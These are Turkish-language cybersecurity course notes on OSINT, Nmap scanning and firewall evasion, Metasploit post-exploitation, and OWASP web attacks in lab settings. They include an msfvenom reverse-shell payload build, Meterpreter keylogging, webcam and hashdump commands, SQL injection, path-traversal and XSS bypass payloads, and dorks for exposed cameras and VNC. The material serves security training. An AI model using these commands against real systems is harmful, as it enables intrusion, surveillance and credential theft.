🛡️ SİBER VATAN YÜZ YÜZE EĞİTİM NOTLARI
Hazırlayan: Kader BERGE

Kapsam: Bilgi Toplama, Tarama, Sızma Testleri, Post-Exploitation ve Web Zafiyetleri

📌 DERS 1: OSINT ve Pasif/Aktif Bilgi Toplama (Keşif Notları)
Sızma testlerinin ilk ve en önemli aşaması hedef hakkında bilgi toplamaktır. Bu derste açık kaynak istihbaratı (OSINT) ve ağ üzerindeki açık cihazların tespiti üzerinde durulmuştur.

1. Arama Motoru Keşifleri ve Bilgi Toplama Araçları
Google Dorking / Google Hacking: Arama motorlarının gelişmiş parametrelerini kullanarak web sitelerindeki hassas dosyaları, açık dizinleri veya yönetici panellerini bulma tekniğidir.

Örnek Kullanım: filetype:xsl "username | password" site:.il (Hassas verileri barındıran xsl dosyalarını arar).

Google Hacking Database (GHDB): Exploit-DB üzerinde yer alan, siber güvenlik araştırmacılarının keşfettiği hazır ve güncel Google dork listesidir.

Web-Check (https://web-check.xyz): Hedef web sitesinin mimarisini, IP adreslerini, DNS kayıtlarını ve bağlantılı olduğu diğer siteleri tek ekranda analiz eden araç.

RocketReach (rocketreach.co): Hedef şirkette çalışan personellerin e-posta adreslerini ve iletişim bilgilerini bulmaya yarayan OSINT aracı.

Tinfoleak (tinfoleak.com): Twitter (X) hesapları üzerinde detaylı analiz ve bilgi toplama yapan araç.

ExifMeta (exifmeta.com): Görsellerin içerisindeki gizli meta verileri (çekildiği konum, kamera modeli, tarih vb.) analiz eden araç.

Have I Been Pwned (haveibeenpwned.com): Bir e-posta adresinin veya parolanın daha önce sızdırılmış veri tabanlarında yer alıp almadığını kontrol eden servis.

Temp Mail (temp-mail.org/tr): Bilgi toplama veya test aşamalarında geçici/kullan-at e-posta adresi oluşturan servis.

Fake Mail Sender (tools.apgy.in/tool/fake-email-sender): Kimlik avı (Phishing) simülasyonları için sahte e-posta gönderim aracı.

2. Alt Alan Adı (Subdomain) ve Altyapı Analizi
Subfinder: Bir alan adına ait alt alan adlarını (subdomain) hızlıca bulan komut satırı aracı.

Kullanım: subfinder -d sibervatan.org

Pentest-Tools Subdomain Finder: Çevrimiçi ortamda çalışan hızlı subdomain tespit aracı.

SecurityTrails: Gelişmiş domain ve DNS geçmişi analizi sunan platform.

Urlscan.io: Bir web sitesine gitmeden arka planda sitenin güvenlik analizini ve ekran görüntüsünü alan servis.

Wappalyzer: Web sitelerinin hangi teknolojileri, CMS sistemlerini ve kütüphaneleri kullandığını gösteren tarayıcı eklentisi.

Cyrops (cyrops.com): Siber tehdit istihbaratı ve analiz platformu.

Wayback Machine (Archive.org): Web sitelerinin geçmiş yıllardaki hallerini ve arşivlenmiş eski sayfalarını gösteren dijital arşiv.

3. IoT ve Ağ Keşif Motorları (Açık Kameralar ve Cihazlar)
Shodan: İnternete bağlı tüm akıllı cihazları (kamera, sunucu, IoT, yazıcı vb.) tarayan arama motoru.

Dork Örneği: http.title:"Blue Iris Remote View" CAMERA "shodan" (Açık Blue Iris kameraları listeler).

Insecam (insecam.org): Dünya genelinde şifresi değiştirilmemiş veya varsayılan şifrede bırakılmış güvenlik kameralarını canlı yayınlayan site.

Censys (censys.com): İnternete açık cihazlar, sertifikalar ve ağ yapılandırmaları hakkında detaylı bilgi sunan arama motoru.

Ağ Bağlantılı Cihaz Keşifleri:

intitle:"EvoCam" inurl:"webcam.html" (EvoCam zafiyetli kameraları bulma dorku).

HP Laser MFP Yazıcılar: Shodan üzerinde açık IP ve portlar üzerinden korumasız yazıcı panellerine erişim sağlanabilir.

VNC Viewer: port:5900 RFB authentication disabled (Şifre doğrulaması devre dışı bırakılmış VNC uzak masaüstü bağlantıları) tespiti yapıldıktan sonra kurban bilgisayara bağlanmak için kullanılan araç.

4. Ağ ve DNS Sorgu Komutları
Whois: Bir alan adının kime ait olduğunu, tescil ve bitiş tarihlerini sorgular.

Nslookup: Alan adlarının IP adresini çıkarır ve DNS kayıtları hakkında bilgi verir.

DNSChecker (dnschecker.org): Bir domainin dünya genelindeki farklı DNS sunucularındaki kayıtlarını doğrular.

ViewDNS (viewdns.info): Tek bir IP üzerinde barınan diğer siteleri (Reverse IP Lookup) ve DNS verilerini analiz eden araç kutusu.

Traceroute: Bilgisayarınızdan çıkan bir paketin hedef sunucuya varana kadar ağ üzerinde hangi yönlendiricilerden (hop) geçtiğini gösterir.

IPinfo (ipinfo.io): Kullanılan IP adresinin coğrafi konumunu, ISP (İnternet Servis Sağlayıcı) bilgisini gösteren servis.

🔍 DERS 2: Ağ Tarama ve Güvenlik Duvarı Atlatma (Nmap Notları)
Bu aşamada aktif tarama yapılarak hedef ağdaki canlı cihazlar, açık portlar, çalışan servisler ve işletim sistemleri tespit edilir.

1. Ağdaki Cihazları Keşfetme (Host Discovery)
Fing: Mobil ve masaüstünde ağa bağlı olan diğer cihazları tespit eden uygulama.

Netdiscover: Yerel ağda (LAN) ARP istekleri göndererek canlı cihazları ve MAC adreslerini bulan araç.

Kullanım: netdiscover -r 192.168.1.0/24

İç Ağ Bilgisi Öğrenme: Linux üzerinde IP adresimizi öğrenmek için ifconfig veya ip a komutları kullanılır.

2. Nmap Tarama Komutları ve Parametreleri
Nmap, ağ taramasının "İsviçre Çakısı"dır. Temel mantığı: "Belediye binasının kapısının arkasında ne olduğunu görmektir."

Temel Tarama: nmap <hedef_IP> (En yaygın 1000 portu tarar).

Agresif Tarama (-A): İşletim sistemi tespiti, versiyon tespiti, script taraması ve traceroute işlemlerini bir arada yapar.

Kullanım: nmap -A <hedef_IP>

Hızlı Tarama (-F): Sadece en sık kullanılan 100 portu tarar.

Birleşik Kullanım: nmap -F -A <hedef_IP> (En sık kullanılan 100 portta agresif analiz yapar).

Belirli Sayıda Popüler Port Taraması: nmap --top-ports 50 <hedef_IP> (En popüler 50 portu tarar).

Tüm Portları Tarama (-p-): 1'den 65535'e kadar olan tüm portları eksiksiz tarar.

Versiyon Taraması (-sV): Açık portlarda çalışan servislerin tam versiyon bilgisini verir. Versiyon bilgisi üzerinden doğrudan CVE (Common Vulnerabilities and Exposures) zafiyet tespiti yapılabilir.

İşletim Sistemi Tespiti (-O): Hedef cihazın hangi işletim sistemini (Windows/Linux) kullandığını tahmin eder.

Ping Taraması (-sP veya -sn): Port taraması yapmadan sadece ağda hangi cihazların açık (canlı) olduğunu tespit eder.

TCP SYN (Yarı Açık) Taraması (-sS): Bağlantıyı tam olarak tamamlamadığı için gizli tarama olarak bilinir. (Sudo yetkisi gerektirir).

UDP Taraması (-sU): UDP protokolü kullanan portları tarar.

Tarama Hız Ayarı (-T[0-5]): Tarama hızını belirler. T4 ve T5 hızlıyken, T1 ve T2 güvenlik duvarlarına yakalanmamak için yavaş (sinsi) çalışır.

Çıktıyı Dosyaya Kaydetme: Taramayı bir metin dosyasına yazdırmak için kullanılır:

Kullanım: nmap <hedef_IP> > output.txt

3. Güvenlik Duvarı (Firewall/IDS) Atlatma Teknikleri
Güvenlik duvarları (Firewall) ağa giren ve çıkan trafiği izler. Bu sistemleri atlatmak için Nmap parametreleri optimize edilir:

Paket Parçalama (-f): Gönderilen ağ paketlerini küçük parçalara bölerek güvenlik duvarının (IDS/IPS) paketi analiz etmesini zorlaştırır.

Kullanım: nmap -sS -f <hedef_IP>

Yemleme / Sahte IP Kullanma (-D): Taramayı yaparken ağa sahte IP adresleri (yem) fırlatır. Güvenlik duvarı loglarında gerçek saldırgan IP'si yüzlerce sahte IP arasında gizlenir (Yemekhane örneği: Herkes sıraya girer ama yemeği kimin aldığı belli olmaz).

Kullanım: nmap -D sahteIP1,sahteIP2,MEGE <hedef_IP>

Tor Ağı Üzerinden Tarama: Kimliği gizlemek için sudo apt install torbrowser-launcher -y ile Tor kurulur ve proxy zincirleri üzerinden tarama yapılabilir.

4. Parola Kırma Hazırlığı
CUPP (cupp -i): Hedef kişiye özel (adı, soyadı, doğum tarihi, evcil hayvanı vb.) bilgileri toplayarak kişiselleştirilmiş wordlist (parola listesi) oluşturan araç.

1337 (Leet Alfabesi): Harflerin sayılarla değiştirilmesi mantığıdır (Örn: kader -> k4d3r). CUPP ve parola kırıcılar bu kombinasyonları kullanır.

💥 DERS 3: Ağ ve Sistem Sızma Testleri (Metasploit Framework)
Hedef sistemdeki zafiyetler tespit edildikten sonra, sisteme sızmak ve yetki elde etmek için Metasploit Framework (msfconsole) kullanılır. Bu laboratuvarda zafiyetli makineler barındıran Vulnhub ekosistemi simüle edilmiştir.

1. Metasploit Temel Arama ve Modül Seçimi
msfconsole: Metasploit konsolunu başlatır.

search httpd: Apache veya diğer HTTP servislerine ait exploitleri arar.

search type:exploit platform:windows smb: Sadece Windows işletim sistemindeki SMB zafiyetlerine yönelik exploitleri filtreler.

use [modül_yolu]: Kullanılacak olan sömürü (exploit) veya yardımcı modülü seçer.

options: Seçilen modülün çalışması için gerekli olan parametreleri (RHOST, LHOST vb.) listeler.

show targets: Seçilen exploite uygun hedef işletim sistemi sürümlerini listeler.

show advanced: Modüle ait gelişmiş/detaylı ince ayarları gösterir.

back: Seçili modülden çıkarak ana menüye döner.

2. Parametre Tanımlama ve Sömürü (Exploitation)
set RHOSTS <hedef_IP> veya set RHOST <hedef_IP>: Kurban makinenin IP adresini tanımlar.

check: Exploiti çalıştırmadan önce hedef makinenin bu zafiyete karşı gerçekten açık barındırıp barındırmadığını test eder.

run veya exploit: Sömürü işlemini başlatır ve hedef sisteme sızmaya çalışır.

3. Temel Meterpreter Komutları (İlk Erişim)
Sızma işlemi başarılı olduğunda gelişmiş bir komut satırı olan Meterpreter oturumu açılır:

sessions -i [id]: Arka planda duran veya farklı zafiyetlerden elde edilen oturumlar arasında geçiş yapmayı sağlar.

getpid: Zararlı yazılımımızın (payload) kurban makinede o an hangi süreç (PID) numarası altında çalıştığını gösterir.

getprivs: Mevcut oturumun sistem üzerinde hangi haklara ve yetkilere sahip olduğunu listeler.

ps: Kurban bilgisayarda çalışan tüm güncel süreçleri listeler.

kill [PID]: Hedef sistemde çalışan tehlikeli bir süreci veya antivirüsü kapatmak için kullanılır.

Dosya İşlemleri:

search -f *.doc: Kurban makinenin diskinde .doc uzantılı kritik belgeleri arar.

upload /root/ornekdosya.doc c:\\: Kendi bilgisayarımızdaki bir dosyayı kurban makineye yükler.

download c:\\windows\\system32\\cmd.exe .: Kurban makinedeki kritik bir dosyayı kendi bilgisayarımıza indirir.

🚀 DERS 4: Sızma Sonrası İşlemler ve Zafiyet Tarama (Post-Exploitation & Nessus)
Sisteme sızıldıktan sonra kalıcılık sağlama, bilgi sızdırma ve ağ içerisinde dikey/yatay hareket etme aşamasıdır.

1. Meterpreter Post-Exploitation Komutları
background: Mevcut Meterpreter oturumunu kapatmadan arka plana alır ve msfconsole ekranına döner.

migrate [PID]: Aktif oturumu kurban makinede asla kapanmayacak olan kararlı bir sürecin (Örn: explorer.exe veya winlogon.exe) içine taşır. Bu sayede kullanıcı açık olan zararlı uygulamayı kapatsa bile bağlantımız kopmaz.

Klavye Dinleme (Keylogging):

keyscan_start: Kurbanın klavye hareketlerini kaydetmeye başlar.

keyscan_dump: Kurbanın o ana kadar klavyede yazdığı kullanıcı adlarını, şifreleri ve mesajları ekrana getirir.

Ağ ve Medya Sömürüsü:

screenshot: Kurbanın o anki ekran görüntüsünü alır.

webcam_stream: Kurbanın kamerasından canlı video akışı başlatır.

Kimlik Bilgisi Sızdırma:

hashdump: Sistemdeki kullanıcı şifrelerinin şifreli hallerini (SAM veritabanı hashlerini) çeker.

search gather/hashdump: Metasploit içindeki diğer gelişmiş şifre toplama modüllerini arar.

CrackStation (crackstation.net): Ele geçirilen şifre hash'lerini kırmak için kullanılan devasa online rainbow table (parola tablosu) veritabanı.

2. MSFVenom ile Özel Exe Oluşturma ve Python Sunucusu
Zararlı Yazılım Üretimi: Kurbanın tıklamasıyla bize tersine bağlantı (reverse_tcp) gönderecek bir ajan dosyası üretilir:

Bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.128 LPORT=4444 -f exe > merhaba.exe
Python HTTP Sunucusu: Üretilen merhaba.exe dosyasını kurbana indirtmek için Metasploit'e ihtiyaç duymadan hızlıca bir web sunucusu ayağa kaldırılır:

Bash
python3 -m http.server 80
Kurban bilgisayardan tarayıcıya gidip http://<Saldırgan_IP> yazıldığında doğrudan bu dosyaya ulaşılır.

3. Kurumsal Zafiyet Tarama Sistemi: Nessus
Kurulum: İndirilen Nessus paketi kurulur: dpkg -i Nessus-...

Servisi Başlatma: /etc/init.d/nessud start

Erişim: Tarayıcı üzerinden https://localhost:8834 veya http://localhost:8834 adreslerinden yönetim paneline gidilerek kurumsal ağ taramaları gerçekleştirilir.

🌐 DERS 5: Web Uygulama Güvenliği ve Web Zafiyetleri (OWASP Top 10)
Bu derste, Hackviser laboratuvar ortamlarında (*.hackviser.space) yer alan web uygulamaları üzerindeki kritik zafiyetler uygulamalı olarak sömürülmüştür.

1. SQL Injection (SQL Enjeksiyonu) ile Kimlik Doğrulama Bypass
Giriş formlarında girdilerin filtrelenmemesi sonucu veritabanına doğrudan müdahale edilmesidir.

Uygulama Alanı: https://devoted-kitty.europe1.hackviser.space

Sömürü: Kullanıcı adı alanına isim' OR 1=1# yazıldığında, arka plandaki SQL sorgusu mantıksal olarak her zaman doğru (true) döner. # karakteri sorgunun şifre kontrolü yapan devam kısmını yorum satırı yaparak siler. Bu sayede şifre girmeden Admin olarak giriş yapılır.

2. Path Traversal / Directory Traversal (Dizin Geçişi) & LFI
Web sitesinin dosya çağırma parametreleri üzerinden sunucunun kök dizinlerine tırmanma zafiyetidir.

Uygulama Alanı: https://first-shaman.europe1.hackviser.space

Sömürü: URL parametresine veya dosya yoluna ../../../../../../etc/passwd yazılarak üst dizinlere çıkılır ve Linux sunucunun hassas kullanıcı listesi okunur.

3. Cross-Site Scripting (XSS) ve Tarayıcı Sömürüsü (BeEF)
Kullanıcı girdilerinin tarayıcı tarafından doğrudan bir JavaScript kodu olarak çalıştırılması zafiyetidir.

Zafiyet Tespiti: Girdi alanlarına <script>alert(1)</script> veya prompt() kodları yazılarak tarayıcıda uyarı kutusu çıkıp çıkmadığı kontrol edilir.

BeEF Framework (beef-xss): Açılımı Browser Exploitation Framework'tür. XSS zafiyeti olan sayfaya BeEF scripti gömüldüğünde, sayfayı ziyaret eden kurbanların tarayıcıları tamamen kontrol altına alınabilir.

Filtre Atlatma (XSS Bypass): Eğer sistem <script> etiketlerini engelliyorsa veya kod bir çift tırnak (") içinde hapsedilmişse, HTML olay tetikleyicileri (Event Handlers) kullanılarak bypass edilir:

HTML
" onmouseover="alert(1)
(Kullanıcı faresini o öğenin üzerine getirdiği an kod tetiklenir).

4. Gelişmiş Komut Sömürüsü (Reverse Shell Payloads)
Revshells (revshells.com): Web uygulamalarında kod çalıştırma (RCE) zafiyeti bulunduğunda, hedef sistemin türüne göre (Bash, Python, PHP, Netcat, Powershell) anlık olarak tersine bağlantı kodları üreten, sızma testlerinin en popüler web otomasyon aracıdır.

🚩 Bölüm 6: CTF (Capture The Flag) Notları
1. Gelişmiş OSINT ve Coğrafi Konum Tespiti
•	Flightradar24 & ADS-B Exchange: Uçak kuyruk numaraları (Örn: tc-lsr) veya uçuş kodları üzerinden hava taşıtlarının canlı konumunu, rotasını ve uçuş geçmişini izlemeyi sağlar. CTF'lerde "Bu fotoğraf hangi uçaktan çekilmiştir?" tarzı sorularda ipucu yakalamak için kullanılır.
•	What3Words (what3words.com): Dünya genelindeki her 3 metrekarelik alanı benzersiz 3 kelimeyle haritalandıran sistemdir. İstihbarat ve fiziksel keşif sorularında nokta atışı konum tespiti ve koordinat şifrelemesi için kullanılır.
•	Intelligence (Gmail OSINT): Bir Gmail adresinin hangi Google servislerine (Maps, YouTube vb.) kayıtlı olduğunu, profil fotoğrafını ve sızdırılmış verilerini analiz eden e-posta istihbarat yöntemidir.
2. Forensics (Adli Bilişim) ve Paket Analizi
•	Apackets ([apackets.com/upload](https://apackets.com/upload)): Ağ trafiği sırasında yakalanan PCAP (paket) dosyalarını tarayıcı üzerinden yükleyerek görsel ve detaylı analiz etmeyi sağlayan online paket analiz (Analysis of Packets) aracıdır. Wireshark olmayan ortamlarda hayat kurtarır.
•	StegOnline: Dijital fotoğrafların içerisine gizlenmiş verileri (Steganografi) ortaya çıkarmak için piksel analizi, renk kanalları (RGBA) ve gizli katman incelemesi yapan online adli bilişim aracıdır.
•	OpenTheFile (openthefile.net): Analiz edilen ancak uzantısı bilinmeyen/bozuk olan dosyaların hangi programlarla açılabileceğini ve ne işe yaradığını gösteren dosya analiz kütüphanesidir.
•	VirusTotal Topluluk Analizi: Şüpheli bir dosyanın SHA256 hash değeri üzerinden, siber güvenlik topluluğunun (community) o dosya hakkında yazdığı analiz notlarını ve zararlı davranış raporlarını inceleme adımıdır.
3. Kriptoloji ve Şifre Çözücüler (Crypto)
•	CyberChef: Siber güvenliğin "İsviçre Çakısı"dır. Veri dönüştürme, şifreleme/şifre çözme (Hex, Base64, URL, XOR vb.) işlemlerini görsel bir akış şemasıyla saniyeler içinde çözer.
•	dCode (dcode.fr): İçerisinde yüzlerce farklı antik, klasik ve modern şifreleme algoritmasını (Sezar, Vigenere, Bacon vb.) barındıran gelişmiş şifre çözücü platformdur. CTF'lerin kriptoloji sorularında ilk duraktır.
•	JWT.io: Web uygulamalarında kimlik doğrulama için kullanılan JSON Web Token (JWT) kodlarını çözerek (decode) içerisindeki gizli verileri, kullanıcı rollerini ve imza doğrulamalarını analiz eden araçtır.
•	Morse Code Adaptive Audio Decoder: Ses dosyaları veya radyo sinyalleri içerisine gizlenmiş Mors kodlarını otomatik olarak dinleyip metne (flag formatına) dönüştüren ses çözücü araçtır.
•	CrackStation: Sızdırılan şifreli hash verilerini (MD5, SHA1, SHA256 vb.) kırmak için kullanılan, milyarlarca kelimelik devasa gökkuşağı tabloları (rainbow tables) veritabanıdır.

Not: Bu dokümanda yer alan tüm çalışmalar yasal laboratuvar ortamlarında eğitim ve test amacıyla gerçekleştirilmiştir.

